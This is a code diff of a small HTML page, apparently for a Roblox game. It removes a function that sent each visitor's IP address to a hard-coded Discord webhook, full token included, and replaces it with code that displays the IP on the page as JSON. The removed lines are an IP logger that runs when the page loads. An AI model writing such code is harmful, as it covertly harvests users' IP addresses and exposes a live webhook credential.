@@ -5,26 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Get IP</title>
     <script>
+        // Function to fetch the IP address
         function getIP() {
             fetch('https://api.ipify.org?format=json')  // Use the ipify API to get the player's IP address
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    sendToDiscord(ip);  // Send the IP to Discord Webhook
+                    // Return the IP as JSON (this will be sent back to the Roblox client)
+                    document.getElementById("ip").innerText = JSON.stringify({ "ip": data.ip });
                 });
-        }
-
-        function sendToDiscord(ip) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1354349394153046076/DdynAOn47B5gt4INJWgKYwc3blgOU6m24hNFVzvYDyPs2T3lz75cUpxbgWnUDbGfCdGz';  // Replace with your Discord webhook URL
-            const message = {
-                content: `Player's IP: ${ip}`  // Send the IP address as a message
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            });
         }
 
         // Call getIP function when the page loads
@@ -33,5 +21,6 @@
 </head>
 <body>
     <h1>Getting Your IP...</h1>
+    <div id="ip"></div>  <!-- This is where the IP will be shown in JSON format -->
 </body>
 </html>
